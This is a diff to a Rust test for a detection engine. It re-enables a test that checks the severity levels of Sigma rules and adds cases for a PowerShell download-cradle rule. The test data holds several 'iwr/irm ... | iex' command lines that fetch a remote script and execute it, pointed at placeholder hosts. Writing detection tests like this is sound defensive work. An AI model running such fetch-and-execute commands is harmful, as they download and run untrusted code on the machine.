@@ -1,7 +1,6 @@
 use detection::{Confidence, DetectionEngine, TelemetryEvent};
 
 #[test]
-#[ignore = "RAFIX-INTEGRATION: level parsing and severity mapping are owned by ACORE"]
 fn authored_rule_levels_drive_expected_severity() {
     let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/sigma");
     let mut failures = Vec::new();
@@ -33,8 +32,20 @@ fn authored_rule_levels_drive_expected_severity() {
         (
             "windows_powershell_download_cradle",
             "powershell.exe",
-            "powershell -c 'iwr http://203.0.113.9/a.ps1 | iex'",
+            "powershell -c 'iwr https://download.invalid/a.ps1 | iex'",
             Confidence::Medium,
+        ),
+        (
+            "windows_powershell_download_cradle",
+            "powershell.exe",
+            "powershell -c 'iwr http://203.0.113.9/a.ps1 | iex'",
+            Confidence::High,
+        ),
+        (
+            "windows_powershell_download_cradle",
+            "powershell.exe",
+            "powershell -c 'irm https://203.0.113.9/a.ps1 | iex'",
+            Confidence::High,
         ),
     ] {
         let source = std::fs::read_to_string(root.join(format!("{file}.yml")))
